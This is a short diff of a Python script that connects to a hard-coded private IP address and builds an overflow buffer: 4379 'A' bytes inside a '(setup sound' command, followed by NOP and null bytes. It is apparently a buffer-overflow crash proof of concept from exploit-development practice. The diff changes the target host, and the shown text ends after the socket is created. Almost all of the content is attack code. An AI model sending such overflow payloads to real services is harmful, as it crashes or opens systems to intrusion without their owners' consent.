@@ -1,11 +1,9 @@
 #!/usr/bin/python
 import socket
 
-#host="192.168.9.135"
-host="172.16.99.84"
+host="192.168.0.32"
 
-crash="\x41"*4379
-
+crash="\x41" * 4379
 buffer="\x11(setup sound " + crash + "\x90\x00#"
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
